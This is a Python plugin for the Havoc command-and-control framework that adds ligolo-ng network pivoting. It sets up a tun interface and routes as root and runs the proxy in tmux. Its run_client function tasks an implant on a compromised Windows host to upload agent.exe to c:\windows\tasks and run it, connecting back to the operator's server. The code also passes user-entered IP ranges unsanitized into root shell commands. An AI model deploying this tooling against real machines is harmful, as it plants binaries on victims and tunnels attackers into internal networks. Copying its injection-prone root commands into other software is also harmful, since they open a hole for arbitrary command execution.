#!/usr/bin/env python
# -*- coding: utf-8 -*-
# Made by papi
# Created on: Sat 09 Dec 2023 09:17:18 PM CET
# ligolo.py
# Description:
#  A plugin for havoc to connect through ligolo and pivot inside of a network in
#  a easy to use way for good pivot rates ^^ it supports multiple network ranges
#  and so on.
# commands:
#  ligo build:
#   build agent -> GOOS=windows go build -o agent.exe cmd/agent/main.go
#   build proxy -> go build -o proxy cmd/proxy/main.go
#  set network:
#   sudo ip tuntap add user $(whoami) mode tun ligolo
#   sudo ip link set ligolo up
#   sudo ip route add 192.168.0.0/24 dev ligolo
# dependencies:
#  -go
#  -tmux
#  -kdesu / pkexec (only for modern systems)


import havoc, havocui
import os, json
import subprocess
from shutil import which

ligolo_current_dir = os.getcwd()
ligolo_install_path = "/data/extensions/havoc-ligolo/"

while not os.path.exists(ligolo_current_dir + ligolo_install_path):
    # not installed through havoc-store so prompt for the path
    ligolo_current_dir = "" # cannot be used because location of ligolo relative to cwd is unknown
    ligolo_install_path = havocui.inputdialog("Install path", "Please enter your install path here for the module to work correctly:").decode()
    if not ligolo_install_path.endswith('/'):
        ligolo_install_path += '/'

settings_pane = havocui.Widget("Ligolo Settings", True)
sudo_command = "" # this is the wrapper for what will be passed to run a command as admin
proxy_bin = ligolo_current_dir + ligolo_install_path + "ligolo-ng/proxy"
agent_bin = ligolo_current_dir + ligolo_install_path + "ligolo-ng/agent.exe"
ligolo_conf_path = ligolo_current_dir + ligolo_install_path + "settings.json"
arguments = "-selfcert -laddr %s:%s"
tmux_session_for_server = "ligolo_server_havoc"
selected_cidr_to_delete = ""
settings_ligolo = {
    "ip_addr": "0.0.0.0",
    "port": "1234",
    "admin": False,
    "ranges": [],
    "certfile": "None",
    "keyfile": "None"
}

def xor(x, y):
    return bool((x and not y) or (not x and y))
def run_as_root(cmd):
    global sudo_command
    if sudo_command == "pkexec -u root":
        os.system("%s %s" % (sudo_command, cmd))
    else: # kdesu needs commands wrapped in quotes
        os.system("%s \"%s\"" % (sudo_command, cmd))
# Functions for the GUI to manage the global dic
def set_ip_listener(addr):
    global settings_ligolo
    settings_ligolo["ip_addr"] = addr
def set_port_listener(port):
    global settings_ligolo
    settings_ligolo["port"] = port
def set_admin():
    global settings_ligolo
    settings_ligolo["admin"] = not settings_ligolo["admin"]
def select_range(cidr):
    global selected_cidr_to_delete
    selected_cidr_to_delete = cidr - 1 # have to remove 1 here for default arg
def run_remove_cidr():
    global selected_cidr_to_delete
    global settings_ligolo
    if selected_cidr_to_delete < len(settings_ligolo["ranges"]) and selected_cidr_to_delete <= 0:
        settings_ligolo["ranges"].remove(settings_ligolo["ranges"][selected_cidr_to_delete])
    else:
        havocui.messagebox("Error!", "Selected CIDR not saved!")
def set_cert_file(path):
    global settings_ligolo
    settings_ligolo["certfile"] = path
def set_key_file(path):
    global settings_ligolo
    settings_ligolo["keyfile"] = path
def run_save():
    global settings_ligolo
    if xor(settings_ligolo["certfile"] == "None", settings_ligolo["keyfile"] == "None"):
        havocui.errormessage("You have only set one of the two certificates...")
        return
    with open(ligolo_conf_path, "w") as fp:
        json.dump(settings_ligolo, fp)

# Actural GUI stuff for settings
def open_settings():
    global settings_ligolo
    settings_pane.clear()
    settings_pane.addLabel("<h3 style='color:#bd93f9'>Settings:</h3>")
    settings_pane.addLabel("<span style='color:#71e0cb'>Listener ip address:</span>")
    settings_pane.addLineedit(settings_ligolo["ip_addr"], set_ip_listener)
    settings_pane.addLabel("<span style='color:#71e0cb'>Listener port:</span>")
    settings_pane.addLineedit(settings_ligolo["port"], set_port_listener)
    settings_pane.addCheckbox("Run server as root", set_admin, settings_ligolo["admin"])
    settings_pane.addLabel("<span style='color:#71e0cb'>Certificates paths (set both as None to dissable):</span>")
    settings_pane.addLabel("Certificate file:")
    settings_pane.addLineedit(settings_ligolo["certfile"], set_cert_file)
    settings_pane.addLabel("Key file:")
    settings_pane.addLineedit(settings_ligolo["keyfile"], set_key_file)
    if len(settings_ligolo["ranges"]) > 0:
        settings_pane.addLabel("<span style='color:#71e0cb'>Saved IP ranges:</span>")
        settings_pane.addCombobox(select_range, "Please select a cidr", *settings_ligolo["ranges"])
        settings_pane.addButton("Remove CIDR", run_remove_cidr)
    settings_pane.addButton("Save", run_save)
    settings_pane.setSmallTab()

# function to check if the server is running in the background
def is_server_ligolo_running():
    try:
        output = subprocess.check_output(['tmux', 'list-sessions'], universal_newlines=True)
        return tmux_session_for_server in output
    except subprocess.CalledProcessError:
        return False

# This function will setup the interface for the port forward and run the server
# inside of a tmux session to then be interacted with if needed.
def start_server():
    if len(settings_ligolo["ranges"]) == 0:
        havocui.errormessage("There are no ranges present inside of the plugin!\nPlease add ranges through Ligolo>Add IP range!")
        return
    if "0.0.0.0" == settings_ligolo["ip_addr"]:
        havocui.errormessage("Your listener ip address is set as 0.0.0.0 which is not possible to connect back to! Please set it to your ip address.")
        return
    run_as_root("ip tuntap add user $(whoami) mode tun ligolo")
    run_as_root("ip link set ligolo up")
    for cidr in settings_ligolo["ranges"]:
        run_as_root("ip route add %s dev ligolo" % cidr)
    if is_server_ligolo_running() == False:
        processed_args = arguments % (settings_ligolo["ip_addr"], settings_ligolo["port"])
        if settings_ligolo["certfile"] != "None":
            processed_args += " -certfile %s -keyfile %s" % (settings_ligolo["certfile"], settings_ligolo["keyfile"])
        os.system("tmux new-session -d -s %s" % tmux_session_for_server)
        if settings_ligolo["admin"]:
            os.system("tmux send-keys -t %s \"sudo %s %s\" C-m" % (tmux_session_for_server, proxy_bin, processed_args))
            havocui.messagebox("Important!", "You can now connect to the ligolo server using the following command, please connect now to type in your sudo password: tmux a -t ligolo_server_havoc")
        else:
            os.system("tmux send-keys -t %s \"%s %s\" C-m" % (tmux_session_for_server, proxy_bin, processed_args))
            havocui.messagebox("Important!", "You can now connect to the ligolo server using the command: tmux a -t ligolo_server_havoc")

def add_ip_range():
    ip_range = havocui.inputdialog("Enter IP range", "Provide the IP range to be added to the interface with the CIDR notation:")
    if ip_range.decode('ascii') != "":
        settings_ligolo["ranges"].append(ip_range.decode('ascii'))
        if is_server_ligolo_running() == True:
            run_as_root("ip route add %s dev ligolo" % ip_range.decode('ascii'))
        run_save()

def run_client(demonID, *param):
    if is_server_ligolo_running() == False:
        havocui.errormessage("Your server is not running so the command will not run")
        return
    if "0.0.0.0" == settings_ligolo["ip_addr"]:
        havocui.errormessage("Your listener ip address is set as 0.0.0.0 which is not possible to connect back to! Please set it to your ip address.")
        return
    TaskID : str = None
    demon : Demon = None

    demon = Demon(demonID)
    TaskID = demon.ConsoleWrite(demon.CONSOLE_TASK, "Tasked demon to connect back to the ligolo server running on %s:%s" % (settings_ligolo["ip_addr"], settings_ligolo["port"]) )
    demon.Command(TaskID, "cd c:\\windows\\tasks")
    demon.Command(TaskID, "upload %s" % (agent_bin))
    demon.Command(TaskID, "shell .\\agent.exe -connect %s:%s -ignore-cert" % (settings_ligolo["ip_addr"], settings_ligolo["port"]))
    # once I get that working
    #demon.Command(TaskID, "noconsolation %s -connect %s:%s -ignore-cert" % (agent_bin, settings["ip_addr"], settings["port"]))
    return TaskID

if which("go") == None or which("tmux") == None or (which("kdesu") == None and which("pkexec") == None):
    havocui.errormessage("You are missing one of these dependencies: go, tmux, kdesu (or pkexec for more modern systems).\nPlease install them and restart havoc to use the ligolo extension.")
else:
    if which('pkexec') != None:
        sudo_command = "pkexec -u root"
    if which('kdesu') != None: # kdesu takes priority over pkexec if installed
        sudo_command = "kdesu -c"
    if os.path.exists(ligolo_conf_path):
        with open(ligolo_conf_path, "r") as fp:
            settings_ligolo = json.load(fp)
    if not os.path.exists(agent_bin) or not os.path.exists(proxy_bin):
        save_cwd = os.getcwd() # if ligolo is not installed through the store ligolo_current_dir was reset to empty string
        os.chdir("%sligolo-ng/" % (ligolo_current_dir + ligolo_install_path))
        os.system("GOOS=windows go build -o agent.exe cmd/agent/main.go")
        os.system("go build -o proxy cmd/proxy/main.go")
        os.chdir(save_cwd) # restore the current working directory to the original value
    havoc.RegisterCommand( run_client, "", "ligolo-ng", "Connect back to the ligolo server.", 0, "", "" )
    havocui.createtab("Ligolo", "Start server", start_server, "Add IP range", add_ip_range, "Settings", open_settings)
